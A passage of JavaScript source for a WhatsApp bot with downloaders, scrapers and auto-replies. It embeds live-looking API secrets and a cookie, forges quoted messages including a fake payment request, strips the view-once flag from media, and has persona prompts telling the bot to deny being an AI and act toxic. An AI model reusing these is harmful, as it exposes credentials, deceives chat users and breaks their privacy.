const sendvn = (teks) => {
NanoBotz.sendMessage(from, { audio: teks, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
async function getAccessToken() {
    try {
        const client_id = 'acc6302297e040aeb6e4ac1fbdfd62c3';
        const client_secret = '0e8439a1280a43aba9a5bc0a16f3f009';
        const basic = Buffer.from(`${client_id}:${client_secret}`).toString("base64");
        const response = await axios.post('https://accounts.spotify.com/api/token', 'grant_type=client_credentials', {
            headers: {
                Authorization: `Basic ${basic}`,
                'Content-Type': 'application/x-www-form-urlencoded',
            },
        });
        const data = response.data;
        return data.access_token;
    } catch (error) {
        console.error('Error getting Spotify access token:', error);
        throw 'An error occurred while obtaining Spotify access token.';
    }
}
async function spotifydl(url) {
  return new Promise(async (resolve, reject) => {
    try {
      const kemii = await axios.get(
        `https://api.fabdl.com/spotify/get?url=${encodeURIComponent(url)}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const kemi = await axios.get(
        `https://api.fabdl.com/spotify/mp3-convert-task/${kemii.data.result.gid}/${kemii.data.result.id}`,
        {
          headers: {
            accept: "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "\"Android\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            Referer: "https://spotifydownload.org/",
            "Referrer-Policy": "strict-origin-when-cross-origin",
          },
        }
      );
      const result = {};
      result.title = kemii.data.result.name;
      result.type = kemii.data.result.type;
      result.artis = kemii.data.result.artists;
      result.durasi = kemii.data.result.duration_ms;
      result.image = kemii.data.result.image;
      result.download = "https://api.fabdl.com" + kemi.data.result.download_url;
      resolve(result);
    } catch (error) {
      reject(error);
    }
  });
};

async function searchSpotify(query) {
    try {
        const access_token = await getAccessToken();
        const response = await axios.get(`https://api.spotify.com/v1/search?q=${query}&type=track&limit=10`, {
            headers: {
                Authorization: `Bearer ${access_token}`,
            },
        });
        const data = response.data;
        const tracks = data.tracks.items.map(item => ({
            name: item.name,
            artists: item.artists.map(artist => artist.name).join(', '),
            popularity: item.popularity,
            link: item.external_urls.spotify,
            image: item.album.images[0].url,
            duration_ms: item.duration_ms,
        }));
        return tracks;
    } catch (error) {
        console.error('Error searching Spotify:', error);
        throw 'An error occurred while searching for songs on Spotify.';
    }
}


async function ytdlnew(videoUrl) {
    return new Promise(async (resolve, reject) => {
        try {
            const searchParams = new URLSearchParams();
            searchParams.append('query', videoUrl);
            searchParams.append('vt', 'mp3');
            const searchResponse = await axios.post(
                'https://tomp3.cc/api/ajax/search',
                searchParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (searchResponse.data.status !== 'ok') {
                throw new Error('Failed to search for the video.');
            }            
            const videoId = searchResponse.data.vid;
            const videoTitle = searchResponse.data.title;
            const mp4Options = searchResponse.data.links.mp4;
            const mp3Options = searchResponse.data.links.mp3;
            const mediumQualityMp4Option = mp4Options[136]; 
            const mp3Option = mp3Options['mp3128']; 
            const mp4ConvertParams = new URLSearchParams();
            mp4ConvertParams.append('vid', videoId);
            mp4ConvertParams.append('k', mediumQualityMp4Option.k);
            const mp4ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp4ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp4ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP4.');
            }
            const mp4DownloadLink = mp4ConvertResponse.data.dlink;
            const mp3ConvertParams = new URLSearchParams();
            mp3ConvertParams.append('vid', videoId);
            mp3ConvertParams.append('k', mp3Option.k);
            const mp3ConvertResponse = await axios.post(
                'https://tomp3.cc/api/ajax/convert',
                mp3ConvertParams.toString(),
                {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                        'Accept': '*/*',
                        'X-Requested-With': 'XMLHttpRequest'
                    }
                }
            );
            if (mp3ConvertResponse.data.status !== 'ok') {
                throw new Error('Failed to convert the video to MP3.');
            }
            const mp3DownloadLink = mp3ConvertResponse.data.dlink;
            resolve({
                title: videoTitle,
                mp4DownloadLink,
                mp3DownloadLink
            });
        } catch (error) {
            reject('Error: ' + error.message);
        }
    });
 }

//autoreply
for (let BhosdikaXeon of NanoVoiceNote) {
if (budy === BhosdikaXeon) {
let audiobuffy = fs.readFileSync(`./data/assets/audio/${BhosdikaXeon}.mp3`)
NanoBotz.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaXeon of NanoSticker){
if (budy === BhosdikaXeon){
let stickerbuffy = fs.readFileSync(`./data/NanoMedia/sticker/${BhosdikaXeon}.webp`)
NanoBotz.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of ImageNano){
if (budy === BhosdikaXeon){
let imagebuffy = fs.readFileSync(`./data/NanoMedia/image/${BhosdikaXeon}.jpg`)
NanoBotz.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaXeon of VideoNano){
if (budy === BhosdikaXeon){
let videobuffy = fs.readFileSync(`./data/NanoMedia/video/${BhosdikaXeon}.mp4`)
NanoBotz.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}
NanoBotz.copyNForward = async (jid, message, forceForward = false, options = {}) => {
let vtype
if (options.readnce) {
message.message = message.message && message.message.ephemeralMessage && message.message.ephemeralMessage.message ? message.message.ephemeralMessage.message : (message.message || undefined)
vtype = Object.keys(message.message.viewOnceMessage.message)[0]
delete(message.message && message.message.ignore ? message.message.ignore : (message.message || undefined))
delete message.message.viewOnceMessage.message[vtype].viewOnce
message.message = {
...message.message.viewOnceMessage.message
}
}
let mtype = Object.keys(message.message)[0]
let content = await generateForwardMessageContent(message, forceForward)
let ctype = Object.keys(content)[0]
let context = {}
if (mtype != "conversation") context = message.message[mtype].contextInfo
content[ctype].contextInfo = {
...context,
...content[ctype].contextInfo
}
const waMessage = await generateWAMessageFromContent(jid, content, options ? {
...content[ctype],
...options,
...(options.contextInfo ? {
contextInfo: {
...content[ctype].contextInfo,
...options.contextInfo
}
} : {})
} : {})
await NanoBotz.relayMessage(jid, waMessage.message, { messageId:  waMessage.key.id })
return waMessage
}


const lep = {
key: {
fromMe: true, 
participant: `0@s.whatsapp.net`, 
...({ remoteJid: "" }) 
}, 
message: { 
"imageMessage": { 
"mimetype": "image/jpeg", 
"caption":  `${ownername}`, 
"jpegThumbnail": defaultpp
}
}
}

const ftext = { 
key: { 
fromMe: false, 
participant: `0@s.whatsapp.net`, 
...(from ? {
remoteJid: `${ownernumber}@s.whatsapp.net` } : {}) }, 
message: { 
extendedTextMessage: { 
text: `${m.pushName}`, 
title: `${m.pushName}`, 
jpegThumbnail: defaultpp } } }
//Fake
	    const ftroli ={key: {fromMe: false,"participant":"0@s.whatsapp.net", "remoteJid": "status@broadcast"}, "message": {orderMessage: {itemCount: 2022,status: 200, thumbnail: thumb, surface: 200, message: botname, orderTitle: ownername, sellerJid: '0@s.whatsapp.net'}}, contextInfo: {"forwardingScore":999,"isForwarded":true},sendEphemeral: true}
		const fdoc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {documentMessage: {title: botname,jpegThumbnail: thumb}}}
		const fvn = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "audioMessage": {"mimetype":"audio/ogg; codecs=opus","seconds":359996400,"ptt": "true"}} } 
		const fgif = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: {"videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'gifPlayback': 'true', 'caption': ownername, 'jpegThumbnail': thumb}}}
		const fgclink = {key: {participant: "0@s.whatsapp.net","remoteJid": "0@s.whatsapp.net"},"message": {"groupInviteMessage": {"groupJid": "6288213840883-1616169743@g.us","inviteCode": "m","groupName": wm, "caption": `${pushname}`, 'jpegThumbnail': thumb}}}
		const fvideo = {key: { fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {}) },message: { "videoMessage": { "title":botname, "h": wm,'seconds': '359996400', 'caption': `${pushname}`, 'jpegThumbnail': thumb}}}
		const floc = {key : {participant : '0@s.whatsapp.net', ...(m.chat ? { remoteJid: `status@broadcast` } : {}) },message: {locationMessage: {name: wm,jpegThumbnail: thumb}}}
		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `status@broadcast` } : {}) }, message: { 'contactMessage': { 'displayName': ownername, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=6285892928715:6285892928715\nitem1.X-ABLabel:Mobile\nEND:VCARD`, 'jpegThumbnail': thumb, thumbnail: thumb,sendEphemeral: true}}}
	    const fakestatus = {key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "status@broadcast" } : {})},message: { "imageMessage": {"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc","mimetype": "image/jpeg","caption": wm,"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=","fileLength": "28777","height": 1080,"width": 1079,"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=","fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=","directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69","mediaKeyTimestamp": "1610993486","jpegThumbnail": fs.readFileSync('./data/image/thumb.jpg'),"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="}}}

let list = []
for (let i of owner) {
list.push({
	    	displayName: await NanoBotz.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await NanoBotz.getName(i)}\nFN:${await NanoBotz.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${yt}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}

const repPy = {
	key: {
		remoteJid: '0@s.whatsapp.net',
		fromMe: false,
		id: `${ownername}`,
		participant: '0@s.whatsapp.net'
	},
	message: {
		requestPaymentMessage: {
			currencyCodeIso4217: "USD",
			amount1000: 999999999,
			requestFrom: '0@s.whatsapp.net',
			noteMessage: {
				extendedTextMessage: {
					text: `${botname}`
				}
			},
			expiryTimestamp: 999999999,
			amount: {
				value: 91929291929,
				offset: 1000,
				currencyCode: "INR"
			}
		}
	}
}

//let xeonrecordin = ['recording','composing']
//let xeonrecordinfinal = xeonrecordin[Math.floor(Math.random() * xeonrecordin.length)]

if (!m.key.fromMe && db.settings[botNumber].autoread){
const readkey = {
remoteJid: m.chat,
id: m.key.id, 
participant: m.isGroup ? m.key.participant : undefined 
}
await NanoBotz.readMessages([readkey]);
}

NanoBotz.sendPresenceUpdate('available', m.chat)

if (global.autoTyping) {
if (command) {
NanoBotz.sendPresenceUpdate('composing', from)
}
}
if (global.autoRecord) {
if (command) {
NanoBotz.sendPresenceUpdate('recording', from)
}
}

const pickRandom = (arr) => {
return arr[Math.floor(Math.random() * arr.length)]
}

const downloadMp4 = async (Link) => {
let gHz = require("./scrape/savefrom")
let Lehd = await gHz.savefrom(Link)
let ghd = await reSize(Lehd.thumb, 300, 300)
let ghed = await ytdl.getInfo(Link)
let gdyr = await NanoBotz.sendMessage(from, {image: { url: Lehd.thumb } , caption: `Channel Name : ${ghed.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${ghed.player_response.videoDetails.channelId}
Title               : ${Lehd.meta.title}
Duration        : ${Lehd.meta.duration}
Desc              : ${ghed.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp4File = getRandom('.mp4')
console.log(color('Download Video With ytdl-core'))
let nana = ytdl(Link)
.pipe(fs.createWriteStream(mp4File))
.on('finish', async () => {
await NanoBotz.sendMessage(from, { video: fs.readFileSync(mp4File), caption: mess.succes, gifPlayback: false }, { quoted: gdyr })
fs.unlinkSync(`./${mp4File}`)
})
} catch (err) {
reply(`${err}`)
}
}


const downloadMp3 = async (Link) => {
let pNx = require("./scrape/savefrom")
let Puxa = await pNx.savefrom(Link)
let MlP = await reSize(Puxa.thumb, 300, 300)
let PlXz = await ytdl.getInfo(Link)
let gedeyeer = await NanoBotz.sendMessage(from, { image: { url: Puxa.thumb } , caption: `Channel Name : ${PlXz.player_response.videoDetails.author}
Channel Link : https://youtube.com/channel/${PlXz.player_response.videoDetails.channelId}
Title : ${Puxa.meta.title}
Duration : ${Puxa.meta.duration}
Desc : ${PlXz.player_response.videoDetails.shortDescription}`}, { quoted : m })
try {
await ytdl.getInfo(Link)
let mp3File = getRandom('.mp3')
console.log(color('Download Audio With ytdl-core'))
ytdl(Link, { filter: 'audioonly' })
.pipe(fs.createWriteStream(mp3File))
.on('finish', async () => {
await NanoBotz.sendMessage(from, { audio: fs.readFileSync(mp3File), mimetype: 'audio/mp4' }, { quoted: gedeyeer })
fs.unlinkSync(mp3File)
})
} catch (err) {
reply(`${err}`)
}
}
//================================================================
if (m.isGroup && !m.key.fromMe && isAutosimi ) {
          let postData = {
    prompt: `${args.join(" ")}`,
    sessionId: `${m.sender}`,
    character: `Kamu adalah simi, kamu bukanlah ai atau chat bot, kamu adalah anak remaja sma, kamu memiliki sifat kasar dan toxic, kadang kamu memakai emoji 🖕 ketika kesal, kamu kalau ngobrol menggunakan bahasa gaul anak Indonesia seperti lu untuk kamu dan gw untuk aku.`
  };
  
  try {
    let response = await axios({
      url: "https://elxyz.me/api/chat",
      method: "POST",
      data: new URLSearchParams(Object.entries(postData)),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    replynano(`${response.data.data.answer}`)
  } catch (error) {
    replynano('yah aku gak bisa jawab pertanyaan mu')
  }
}

if (m.isGroup && isAutoAiGc) {
let postData = {
    prompt: `${args.join(" ")}`,
    sessionId: `${m.sender}`,
    character: `Kamu adalah nano, kamu bukanlah ai atau chat bot, kamu adalah anak remaja sma, kamu memiliki sifat baik tapi suka toxic, kadang kamu memakai emoji 🖕 ketika kesal, kamu kalau ngobrol menggunakan bahasa gaul seperti lu untuk kamu dan gw untuk aku.`
  };
  
  try {
    let response = await axios({
      url: "https://elxyz.me/api/chat",
      method: "POST",
      data: new URLSearchParams(Object.entries(postData)),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    replynano(`${response.data.data.answer}`)
  } catch (error) {
    replynano('yah aku gak bisa jawab pertanyaan mu')
  }
}
if (automati) {
  nodecron.schedule('0 */1 * * *', () => {
    process.exit()
  })
}
if (shouldExit) {
    nodecron.schedule('0 */1 * * *', () => {
        fs.readdir("./session", async function (err, files) {
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
   )
if(filteredArray.length == 0) return console.log(`${teks}`)
filteredArray.map(function(e, i){
teks += (i+1)+`. ${e}\n`
})     
await filteredArray.forEach(function (file) {
});
await sleep(2000)
console.log("Berhasil menghapus semua Kenangan di folder session")    
});
    })
}
if (!m.key.fromMe && m.isGroup && isnanochat) {
  let postData = {
    prompt: `${args.join(" ")}`,
    sessionId: `${m.sender}`,
    character: `Kamu adalah nano, kamu bukan lah ai ataupun chat bot, kamu adalah anak remaja yang mengikuti pergaulan anak muda jama sekarang, terkadang kamu juga suka toxic ataupun kasar kepada orang lain, tetapi kamu juga terkadang suka baik kepada orang`
  };
  
  try {
    let response = await axios({
      url: "https://elxyz.me/api/chat",
      method: "POST",
      data: new URLSearchParams(Object.entries(postData)),
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
      }
    })
    replynano(`${response.data.data.answer}`)
    if (response.data.data.images) {
      await NanoBotz.sendMessage(m.chat, { image: { url: response.data.data.images } }, { quoted: m })
    }
  } catch (error) {
    replynano('yah aku gak bisa jawab pertanyaan mu')
  }
}
//=================================================================
if (!m.isGroup && !DanzTheCreator && db.settings[botNumber].onlygrub ) {
        	if (command){
            return replynano(` Halo sobat! Karena Kami Ingin Mengurangi Spam, Silakan Gunakan Bot di Grup Chat !\n\nJika Anda mengalami masalah silakan chat pemilik wa.me/${ownernumber}`)
            }
        }
//=================================================================
async function makeSticker(media,Sticker, StickerTypes){
  const getRandom = (ext) => {
            return `${Math.floor(Math.random() * 10000)}${ext}`
        }
let jancok = new Sticker(media, {
pack: global.packname, // The pack name
author: global.author, // The author name
type: StickerTypes.FULL, // The sticker type
categories: ['🤩', '🎉'], // The sticker category
id: '12345', // The sticker id
quality: 70, // The quality of the output file
background: '#FFFFFF00' // The sticker background color (only for full stickers)
})
let stok = getRandom('.webp')
let nono = await jancok.toFile(stok)
let nah = fs.readFileSync(nono.path);
await NanoBotz.sendMessage(from,{sticker: nah},{quoted: m})
await fs.unlinkSync(stok)
}

async function sendPoll(jid, text, list) {
NanoBotz.relayMessage(jid, {
"pollCreationMessage": {
"name": text,
"options": list.map(v => { return { optionName: v } }),
"selectableOptionsCount": list.length
}
}, {})
}

async function rmbg(buffer) {
let form = new FormData
form.append("size", "auto")
form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
let res = await axios({
  url: "https://api.remove.bg/v1.0/removebg",
  method: "POST",
  data: form,
  responseType: "arraybuffer",
  headers: {
    "X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
    ...form.getHeaders()
  }
})
return res.data
}

async function ephoto(url, texk) {
let form = new FormData 
let gT = await axios.get(url, {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
  }
})
let $ = cheerio.load(gT.data)
let text = texk
let token = $("input[name=token]").val()
let build_server = $("input[name=build_server]").val()
let build_server_id = $("input[name=build_server_id]").val()
form.append("text[]", text)
form.append("token", token)
form.append("build_server", build_server)
form.append("build_server_id", build_server_id)
let res = await axios({
  url: url,
  method: "POST",
  data: form,
  headers: {
    Accept: "*/*",
    "Accept-Language": "en-US,en;q=0.9",
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"]?.join("; "),
    ...form.getHeaders()
  }
})
let $$ = cheerio.load(res.data)
let json = JSON.parse($$("input[name=form_value_input]").val())
json["text[]"] = json.text
delete json.text
let { data } = await axios.post("https://en.ephoto360.com/effect/create-image", new URLSearchParams(json), {
  headers: {
    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36",
    cookie: gT.headers["set-cookie"].join("; ")
    }
})
return build_server + data.image
}

async function quotesanime () {
    return new Promise((resolve, reject) => {
        const page = Math.floor(Math.random() * 184)
        axios.get('https://otakotaku.com/quote/feed/'+page)
        .then(({ data }) => {
            const $ = cheerio.load(data)
            const hasil = []
            $('div.kotodama-list').each(function(l, h) {
hasil.push({
link: $(h).find('a').attr('href'),
gambar: $(h).find('img').attr('data-src'),
karakter: $(h).find('div.char-name').text().trim(),
anime: $(h).find('div.anime-title').text().trim(),
episode: $(h).find('div.meta').text(),
up_at: $(h).find('small.meta').text(),
quotes: $(h).find('div.quote').text().trim()
})
            })
            resolve(hasil)
        }).catch(reject)
    })
}


async function addCountCmdUser(nama, sender, u) {
var posi = null
var pos = null
Object.keys(u).forEach((i) => {
if (u[i].jid === sender) {
posi = i
}
})
if (posi === null) {
u.push({jid: m.sender, db: [{nama: nama, count: 0}]})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
Object.keys(u).forEach((i) => {
if (u[i].jid === m.sender) {
posi = i
}
})
}
if (posi !== null) {
Object.keys(u[posi].db).forEach((i) => {
if (u[posi].db[i].nama === nama) {
pos = i
}
})
if (pos === null) {
u[posi].db.push({nama: nama, count: 1})
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
} else {
u[posi].db[pos].count += 1
fs.writeFileSync('./database/commandUser.json', JSON.stringify(u, null, 2));
}
}
}

NanoBotz.autoshalat = NanoBotz.autoshalat ? NanoBotz.autoshalat : {}
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? NanoBotz.user.id : m.sender
let id = m.chat 
if (id in NanoBotz.autoshalat) {
    return false
}

let jadwalSholat = {
    shubuh: '04:39',
    terbit: '05:44',
    dhuha: '06:02',
    dzuhur: '12:02',
    ashar: '15:15',
    magrib: '17:52',
    isya: '19:01',
}

const datek = new Date((new Date).toLocaleString("en-US", { timeZone: "Asia/Jakarta" }))
const hours = datek.getHours()
const minutes = datek.getMinutes()
const timeNow = `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}`

for (let [sholat, waktu] of Object.entries(jadwalSholat)) {
    if (timeNow === waktu) {
        NanoBotz.autoshalat[id] = [
            NanoBotz.sendMessage(m.chat, {
                        audio: {
                            url: 'https://media.vocaroo.com/mp3/1ofLT2YUJAjQ'
                        },
                        mimetype: 'audio/mp4',
                        ptt: true,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                mediaType: 1,
                                mediaUrl: '',
                                title: `Selamat menunaikan Ibadah Sholat ${sholat}`,
                                body: `🕑 ${waktu}`,
                                sourceUrl: '',
                                thumbnail: await fs.readFileSync('./data/image/jdw.png'),
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m,
                        mentions: participants.map(a => a.id)
                    }),
            setTimeout(async () => {
                delete NanoBotz.autoshalat[m.chat]
            }, 57000)
        ]
    }
}
async function addCountCmd(nama, sender, _db) {
addCountCmdUser(nama, m.sender, _cmdUser)
var posi = null
Object.keys(_db).forEach((i) => {
if (_db[i].nama === nama) {
posi = i
}
})
if (posi === null) {
_db.push({nama: nama, count: 1})
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
} else {
_db[posi].count += 1
fs.writeFileSync('./database/command.json',JSON.stringify(_db, null, 2));
}
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}


async function GetBuffer(url) {
	return new Promise(async (resolve, reject) => {
		let buffer;
		await jimp
			.read(url)
			.then((image) => {
				image.getBuffer(image._originalMime, function (err, res) {
					buffer = res;
				});
			})
			.catch(reject);
		if (!Buffer.isBuffer(buffer)) reject(false);
		resolve(buffer);
	});
}
function GetType(Data) {
	return new Promise((resolve, reject) => {
		let Result, Status;
		if (Buffer.isBuffer(Data)) {
			Result = new Buffer.from(Data).toString("base64");
			Status = 0;
		} else {
			Status = 1;
		}
		resolve({
			status: Status,
			result: Result,
		});
	});
}
async function tiktok2(query) {
  return new Promise(async (resolve, reject) => {
    try {
    const encodedParams = new URLSearchParams();
encodedParams.set('url', query);
encodedParams.set('hd', '1');

      const response = await axios({
        method: 'POST',
        url: 'https://tikwm.com/api/',
        headers: {
          'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
          'Cookie': 'current_language=en',
          'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
        },
        data: encodedParams
      });
      const videos = response.data.data;
        const result = {
          title: videos.title,
          cover: videos.cover,
          origin_cover: videos.origin_cover,
          no_watermark: videos.play,
          watermark: videos.wmplay,
          music: videos.music
        };
        resolve(result);
    } catch (error) {
      reject(error);
    }
  });
}
async function Cartoon(url) {
	return new Promise(async (resolve, reject) => {
		let Data;
		try {
			let buffer = await GetBuffer(url);
			let Base64 = await GetType(buffer);
			await axios
				.request({
					url: "https://access1.imglarger.com/PhoAi/Upload",
					method: "POST",
					headers: {
						connection: "keep-alive",
						accept: "application/json, text/plain, */*",
						"content-type": "application/json",
					},
					data: JSON.stringify({
						type: 11,
						base64Image: Base64.result,
					}),
				})
				.then(async ({ data }) => {
					let code = data.data.code;
					let type = data.data.type;
					while (true) {
						let LopAxios = await axios.request({
							url: "https://access1.imglarger.com/PhoAi/CheckStatus",
							method: "POST",
							headers: {
								connection: "keep-alive",
								accept: "application/json, text/plain, */*",
								"content-type": "application/json",
							},
							data: JSON.stringify({
								code: code,
								isMember: 0,
								type: type,
							}),
						});
						let status = LopAxios.data.data.status;
						if (status == "success") {
							Data = {
								message: "success",
								download: {
									full: LopAxios.data.data.downloadUrls[0],
									head: LopAxios.data.data.downloadUrls[1],
								},
							};
							break;
						} else if (status == "noface") {
							Data = {
								message: "noface",
							};
							break;
						}
					}
				});
		} catch (_error) {
			Data = false;
		} finally {
			if (Data == false) {
				reject(false);
			}
			resolve(Data);
		}
	});
}
function randomId() {
	return Math.floor(100000 + Math.random() * 900000);
}

async function igstalk(Username) {
  return new Promise((resolve, reject) => {
    axios.get('https://dumpor.com/v/'+Username, {
      headers: {
        "cookie": "_inst_key=SFMyNTY.g3QAAAABbQAAAAtfY3NyZl90b2tlbm0AAAAYWGhnNS1uWVNLUU81V1lzQ01MTVY2R0h1.fI2xB2dYYxmWqn7kyCKIn1baWw3b-f7QvGDfDK2WXr8",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
      }
    }).then(res => {
      const $ = cheerio.load(res.data)
      const result = {
        profile: $('#user-page > div.user > div.row > div > div.user__img').attr('style').replace(/(background-image: url\(\'|\'\);)/gi, ''),
        fullname: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > a > h1').text(),
        username: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > div > h4').text(),
        post: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(1)').text().replace(' Posts',''),
        followers: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(2)').text().replace(' Followers',''),
        following: $('#user-page > div.user > div > div.col-md-4.col-8.my-3 > ul > li:nth-child(3)').text().replace(' Following',''),
        bio: $('#user-page > div.user > div > div.col-md-5.my-3 > div').text()
      }
      resolve(result)
    })
  })
}


async function replyprem(teks) {
    reply(`Fitur ini untuk pengguna premium, hubungi pemilik untuk menjadi pengguna premium`)
}
        // Autosticker gc
        if (isAutoSticker) {
            if (/image/.test(mime) && !/webp/.test(mime)) {
let mediac = await quoted.download()
await NanoBotz.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return
let mediac = await quoted.download()
await NanoBotz.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
//=========================================\\
// Auto download tiktok
  if (budy.startsWith('https://vt.tiktok.com/') || budy.startsWith('https://www.tiktok.com/') || budy.startsWith('https://t.tiktok.com/') || budy.startsWith('https://vm.tiktok.com/')) {
    try {
reply(mess.wait)
require('./lib/tiktok').Tiktok(budy).then( data => {
const ttcp = `*Author*: ${data.author}\n*Title*: ${data.title}\n\n©${botname}`
NanoBotz.sendMessage(m.chat, { caption: ttcp, video: { url: data.watermark }}, {quoted:m})
})
} catch (error) {
     const data = await fetchJson(`https://itzpire.com/download/tiktok?url=${encodeURIComponent(text)}&type=v2`);

const caption = `┈──────────────────────⫺
            *ㄒ丨ҜㄒㄖҜ         丨几千ㄖ*
┈──────────────────────⫺
*Author*: ${data.data.author.nickname}
*Like*: ${data.data.statistics.likeCount}
*Komentar*: ${data.data.statistics.commentCount}
*Share*: ${data.data.statistics.shareCount}
*Title*: ${data.data.desc}
